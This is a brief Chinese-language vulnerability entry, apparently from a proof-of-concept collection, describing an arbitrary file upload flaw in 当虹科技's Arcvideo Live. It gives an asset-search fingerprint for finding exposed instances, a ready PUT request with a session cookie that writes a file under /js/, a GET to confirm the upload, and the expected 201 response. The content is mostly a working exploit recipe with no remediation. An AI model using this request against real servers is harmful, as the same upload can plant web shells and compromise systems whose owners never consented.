# 当虹科技ArcvideoLive存在任意文件上传漏洞

- **系统**：当虹科技　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="当虹科技-Arcvideo-Live"`
- **请求**：`PUT /js/test123.txt HTTP/1.1`
- **关键头**：`Cookie: arcvideo-live-session=B12768B779A331F514181CB7B71A5BBB`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 6`

**请求体 / payload**
```
123456
上传定位
GET /js/test123.txt HTTP/1.1
```
- **预期**：201　|　—